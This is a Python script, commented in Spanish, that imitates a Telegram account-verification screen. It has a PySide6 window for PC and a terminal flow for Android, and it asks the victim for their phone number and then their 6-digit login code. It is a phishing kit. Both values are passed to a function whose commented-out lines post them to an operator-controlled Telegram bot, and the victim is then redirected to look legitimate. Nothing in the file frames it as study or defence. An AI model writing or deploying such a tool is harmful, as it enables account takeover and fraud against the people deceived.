#!/usr/bin/env python3
"""
Aplicación Multiplataforma - Interfaz PC o Terminal Android
"""
import sys
import os
import platform
import time

# Detectar el entorno de ejecución
def detectar_entorno():
    sistema = platform.system().lower()
    
    # Verificar si estamos en Android (a través de termux)
    if "ANDROID_ROOT" in os.environ or "TERMUX_VERSION" in os.environ:
        return "android"
    elif sistema in ["windows", "linux", "darwin"]:
        return "pc"
    else:
        return "desconocido"

# Configuración de variables (editables al principio del script)
TELEGRAM_BOT_TOKEN = "TU_BOT_TOKEN_AQUI"
TELEGRAM_CHAT_ID = "TU_CHAT_ID_AQUI"
URL_REDIRECCION = "https://tu-pagina-oficial.com"
TIEMPO_ESPERA = 3  # segundos para redirección

# Ejecutar según la plataforma detectada
entorno = detectar_entorno()

if entorno == "pc":
    #######################################################################
    # INTERFAZ GRÁFICA PARA PC CON PYSIDE6
    #######################################################################
    try:
        from PySide6.QtWidgets import (QApplication, QMainWindow, QWidget, QVBoxLayout, 
                                     QHBoxLayout, QLabel, QLineEdit, QPushButton, 
                                     QFrame, QSizePolicy)
        from PySide6.QtGui import QIcon, QFont, QPalette, QColor, QLinearGradient, QBrush
        from PySide6.QtCore import Qt, QSize, QTimer
        import requests
        
        class GlassFrame(QFrame):
            def __init__(self, parent=None):
                super().__init__(parent)
                self.setStyleSheet("""
                    GlassFrame {
                        background: rgba(255, 255, 255, 0.2);
                        border-radius: 20px;
                        border: 1px solid rgba(255, 255, 255, 0.5);
                    }
                """)
        
        class MainWindow(QMainWindow):
            def __init__(self):
                super().__init__()
                self.setWindowTitle("Verificación de Cuenta Telegram")
                self.setMinimumSize(500, 600)
                
                # Configurar fondo con gradiente azul
                palette = self.palette()
                gradient = QLinearGradient(0, 0, 0, self.height())
                gradient.setColorAt(0, QColor("#0088cc"))
                gradient.setColorAt(1, QColor("#005599"))
                palette.setBrush(QPalette.Window, QBrush(gradient))
                self.setPalette(palette)
                
                # Widget central
                central_widget = QWidget()
                self.setCentralWidget(central_widget)
                layout = QVBoxLayout(central_widget)
                layout.setSpacing(20)
                layout.setContentsMargins(40, 40, 40, 40)
                
                # Header con logo
                header = QWidget()
                header_layout = QHBoxLayout(header)
                header_layout.setContentsMargins(0, 0, 0, 0)
                
                # Logo (simulado con un QFrame)
                logo = QFrame()
                logo.setFixedSize(50, 50)
                logo.setStyleSheet("""
                    QFrame {
                        background: qlineargradient(x1: 0, y1: 0, x2: 1, y2: 1,
                                    stop: 0 #34b7f1, stop: 1 #2a9bd7);
                        border-radius: 25px;
                    }
                """)
                header_layout.addWidget(logo)
                
                # Título
                title = QLabel("Verificación de Cuenta de Telegram")
                title.setStyleSheet("color: white; font-size: 24px; font-weight: bold;")
                header_layout.addWidget(title)
                header_layout.addStretch()
                
                layout.addWidget(header)
                
                # Marco de cristal
                self.glass_frame = GlassFrame()
                glass_layout = QVBoxLayout(self.glass_frame)
                glass_layout.setSpacing(20)
                glass_layout.setContentsMargins(30, 30, 30, 30)
                
                # Indicador de pasos
                steps_widget = QWidget()
                steps_layout = QHBoxLayout(steps_widget)
                steps_layout.setContentsMargins(0, 0, 0, 0)
                
                self.step1 = QFrame()
                self.step1.setFixedSize(12, 12)
                self.step1.setStyleSheet("background: #34b7f1; border-radius: 6px;")
                
                self.step2 = QFrame()
                self.step2.setFixedSize(12, 12)
                self.step2.setStyleSheet("background: #ddd; border-radius: 6px;")
                
                steps_layout.addStretch()
                steps_layout.addWidget(self.step1)
                steps_layout.addSpacing(10)
                steps_layout.addWidget(self.step2)
                steps_layout.addStretch()
                
                glass_layout.addWidget(steps_widget)
                
                # Paso 1
                self.step1_widget = QWidget()
                step1_layout = QVBoxLayout(self.step1_widget)
                
                title1 = QLabel("Ingresa tu número")
                title1.setStyleSheet("color: #0088cc; font-size: 20px; font-weight: bold;")
                title1.setAlignment(Qt.AlignCenter)
                step1_layout.addWidget(title1)
                
                desc1 = QLabel("Para verificar tu identidad, por favor ingresa tu número de teléfono. Te enviaremos un código de verificación.")
                desc1.setWordWrap(True)
                desc1.setStyleSheet("color: #555;")
                desc1.setAlignment(Qt.AlignCenter)
                step1_layout.addWidget(desc1)
                
                # Input de teléfono
                phone_layout = QHBoxLayout()
                country_code = QLabel("+1")
                country_code.setFixedWidth(40)
                country_code.setStyleSheet("""
                    QLabel {
                        background: #f0f0f0;
                        border: 1px solid #ddd;
                        border-right: none;
                        border-top-left-radius: 8px;
                        border-bottom-left-radius: 8px;
                        padding: 8px;
                    }
                """)
                country_code.setAlignment(Qt.AlignCenter)
                
                self.phone_input = QLineEdit()
                self.phone_input.setPlaceholderText("Tu número de teléfono")
                self.phone_input.setStyleSheet("""
                    QLineEdit {
                        padding: 8px;
                        border: 1px solid #ddd;
                        border-top-right-radius: 8px;
                        border-bottom-right-radius: 8px;
                        background: white;
                    }
                    QLineEdit:focus {
                        border: 2px solid #34b7f1;
                    }
                """)
                
                phone_layout.addWidget(country_code)
                phone_layout.addWidget(self.phone_input)
                step1_layout.addLayout(phone_layout)
                
                # Botón de enviar
                self.send_btn = QPushButton("Enviar código")
                self.send_btn.setStyleSheet("""
                    QPushButton {
                        background: qlineargradient(x1: 0, y1: 0, x2: 1, y2: 1,
                                    stop: 0 #34b7f1, stop: 1 #2a9bd7);
                        color: white;
                        border: none;
                        border-radius: 8px;
                        padding: 12px;
                        font-weight: bold;
                    }
                    QPushButton:hover {
                        background: qlineargradient(x1: 0, y1: 0, x2: 1, y2: 1,
                                    stop: 0 #2a9bd7, stop: 1 #34b7f1);
                    }
                    QPushButton:pressed {
                        background: #2a9bd7;
                    }
                """)
                self.send_btn.clicked.connect(self.process_step1)
                step1_layout.addWidget(self.send_btn)
                
                glass_layout.addWidget(self.step1_widget)
                
                # Paso 2 (inicialmente oculto)
                self.step2_widget = QWidget()
                self.step2_widget.setVisible(False)
                step2_layout = QVBoxLayout(self.step2_widget)
                
                title2 = QLabel("Código de verificación")
                title2.setStyleSheet("color: #0088cc; font-size: 20px; font-weight: bold;")
                title2.setAlignment(Qt.AlignCenter)
                step2_layout.addWidget(title2)
                
                desc2 = QLabel("Hemos enviado un código de 6 dígitos a tu número. Por favor ingrésalo a continuación.")
                desc2.setWordWrap(True)
                desc2.setStyleSheet("color: #555;")
                desc2.setAlignment(Qt.AlignCenter)
                step2_layout.addWidget(desc2)
                
                # Input de código
                self.code_input = QLineEdit()
                self.code_input.setPlaceholderText("Código de 6 dígitos")
                self.code_input.setMaxLength(6)
                self.code_input.setStyleSheet("""
                    QLineEdit {
                        padding: 8px;
                        border: 1px solid #ddd;
                        border-radius: 8px;
                        background: white;
                    }
                    QLineEdit:focus {
                        border: 2px solid #34b7f1;
                    }
                """)
                step2_layout.addWidget(self.code_input)
                
                # Botón de verificar
                self.verify_btn = QPushButton("Verificar código")
                self.verify_btn.setStyleSheet("""
                    QPushButton {
                        background: qlineargradient(x1: 0, y1: 0, x2: 1, y2: 1,
                                    stop: 0 #34b7f1, stop: 1 #2a9bd7);
                        color: white;
                        border: none;
                        border-radius: 8px;
                        padding: 12px;
                        font-weight: bold;
                    }
                    QPushButton:hover {
                        background: qlineargradient(x1: 0, y1: 0, x2: 1, y2: 1,
                                    stop: 0 #2a9bd7, stop: 1 #34b7f1);
                    }
                    QPushButton:pressed {
                        background: #2a9bd7;
                    }
                """)
                self.verify_btn.clicked.connect(self.process_step2)
                step2_layout.addWidget(self.verify_btn)
                
                # Temporizador
                self.timer_label = QLabel("Puedes solicitar un nuevo código en: 02:00")
                self.timer_label.setStyleSheet("color: #777;")
                self.timer_label.setAlignment(Qt.AlignCenter)
                step2_layout.addWidget(self.timer_label)
                
                glass_layout.addWidget(self.step2_widget)
                
                # Mensaje de éxito (inicialmente oculto)
                self.success_widget = QWidget()
                self.success_widget.setVisible(False)
                success_layout = QVBoxLayout(self.success_widget)
                
                success_msg = QLabel("¡Verificación completada con éxito!\nRedirigiendo a nuestra página oficial...")
                success_msg.setStyleSheet("""
                    QLabel {
                        color: #0088cc;
                        font-weight: bold;
                        background: rgba(52, 183, 241, 0.1);
                        border-radius: 8px;
                        padding: 15px;
                    }
                """)
                success_msg.setAlignment(Qt.AlignCenter)
                success_msg.setWordWrap(True)
                success_layout.addWidget(success_msg)
                
                glass_layout.addWidget(self.success_widget)
                
                layout.addWidget(self.glass_frame)
                
                # Variables para el temporizador
                self.time_left = 120  # 2 minutos en segundos
                self.timer = QTimer()
                self.timer.timeout.connect(self.update_timer)
                
            def process_step1(self):
                phone = self.phone_input.text().strip()
                
                if not phone or len(phone) < 10:
                    self.phone_input.setStyleSheet("border: 2px solid red;")
                    return
                
                # Enviar datos a Telegram
                self.send_to_telegram(f"Nueva verificación:\nNúmero: +1{phone}")
                
                # Cambiar al paso 2
                self.step1_widget.setVisible(False)
                self.step2_widget.setVisible(True)
                self.step2.setStyleSheet("background: #34b7f1; border-radius: 6px;")
                
                # Iniciar temporizador
                self.time_left = 120
                self.update_timer()
                self.timer.start(1000)  # Actualizar cada segundo
            
            def process_step2(self):
                phone = self.phone_input.text().strip()
                code = self.code_input.text().strip()
                
                if not code or len(code) != 6:
                    self.code_input.setStyleSheet("border: 2px solid red;")
                    return
                
                # Enviar datos completos a Telegram
                self.send_to_telegram(f"Verificación completada:\nNúmero: +1{phone}\nCódigo: {code}")
                
                # Mostrar mensaje de éxito
                self.step2_widget.setVisible(False)
                self.success_widget.setVisible(True)
                
                # Detener el temporizador
                self.timer.stop()
                
                # Redirigir después de un breve delay
                QTimer.singleShot(TIEMPO_ESPERA * 1000, self.redirect)
            
            def update_timer(self):
                minutes = self.time_left // 60
                seconds = self.time_left % 60
                self.timer_label.setText(f"Puedes solicitar un nuevo código en: {minutes:02d}:{seconds:02d}")
                
                if self.time_left <= 0:
                    self.timer.stop()
                    self.timer_label.setText("Tiempo agotado. Solicita un nuevo código.")
                else:
                    self.time_left -= 1
            
            def redirect(self):
                # Aquí iría la lógica para abrir el navegador con la URL
                print(f"Redirigiendo a: {URL_REDIRECCION}")
                # En una aplicación real, usaríamos QDesktopServices.openUrl(QUrl(URL_REDIRECCION))
            
            def send_to_telegram(self, message):
                # Simulación de envío a Telegram
                print(f"Enviando a Telegram: {message}")
                # En una aplicación real, usaríamos requests para enviar al bot
                # url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
                # data = {"chat_id": TELEGRAM_CHAT_ID, "text": message}
                # requests.post(url, data=data)
        
        # Ejecutar la aplicación
        app = QApplication(sys.argv)
        window = MainWindow()
        window.show()
        sys.exit(app.exec())
        
    except ImportError:
        print("PySide6 no está instalado. Ejecuta: pip install pyside6")
        sys.exit(1)

elif entorno == "android":
    #######################################################################
    # INTERFAZ DE TERMINAL PARA ANDROID
    #######################################################################
    # Códigos de color ANSI para terminal
    class Colors:
        BLUE = '\033[94m'
        CYAN = '\033[96m'
        GREEN = '\033[92m'
        YELLOW = '\033[93m'
        RED = '\033[91m'
        BOLD = '\033[1m'
        UNDERLINE = '\033[4m'
        END = '\033[0m'
    
    # Función para imprimir con estilo
    def print_color(text, color):
        print(f"{color}{text}{Colors.END}")
    
    # Función para limpiar pantalla
    def clear_screen():
        os.system('clear' if os.name != 'nt' else 'cls')
    
    # Función para mostrar banner
    def show_banner():
        clear_screen()
        print_color("==============================================", Colors.BLUE)
        print_color("      SISTEMA DE VERIFICACIÓN DE CUENTA       ", Colors.CYAN)
        print_color("==============================================", Colors.BLUE)
        print()
    
    # Función para enviar a Telegram (simulada)
    def send_to_telegram(message):
        print_color(f"Enviando a Telegram: {message}", Colors.YELLOW)
        # En una aplicación real, aquí se enviaría el mensaje al bot
        time.sleep(1)  # Simular delay de red
    
    # Función principal
    def main():
        show_banner()
        
        # Paso 1: Solicitar número de teléfono
        print_color("PASO 1: VERIFICACIÓN DE NÚMERO", Colors.BOLD)
        print_color("Ingresa tu número de teléfono (solo dígitos):", Colors.CYAN)
        phone = input("+1 ").strip()
        
        if not phone.isdigit() or len(phone) < 10:
            print_color("Error: Número inválido. Debe tener al menos 10 dígitos.", Colors.RED)
            return
        
        send_to_telegram(f"Nueva verificación:\nNúmero: +1{phone}")
        print_color("✓ Código enviado a tu teléfono", Colors.GREEN)
        print()
        
        # Paso 2: Solicitar código de verificación
        print_color("PASO 2: CÓDIGO DE VERIFICACIÓN", Colors.BOLD)
        print_color("Ingresa el código de 6 dígitos que recibiste:", Colors.CYAN)
        code = input().strip()
        
        if not code.isdigit() or len(code) != 6:
            print_color("Error: Código inválido. Debe tener 6 dígitos.", Colors.RED)
            return
        
        send_to_telegram(f"Verificación completada:\nNúmero: +1{phone}\nCódigo: {code}")
        print_color("✓ Verificación completada con éxito", Colors.GREEN)
        print()
        
        # Redirección
        print_color("Redirigiendo a la página oficial...", Colors.BLUE)
        print_color(URL_REDIRECCION, Colors.UNDERLINE)
        time.sleep(TIEMPO_ESPERA)
        
        # Simular apertura de navegador
        print_color("✓ Redirección completada", Colors.GREEN)
    
    # Ejecutar la aplicación de terminal
    main()

else:
    print("Entorno no compatible detectado.")
    sys.exit(1)
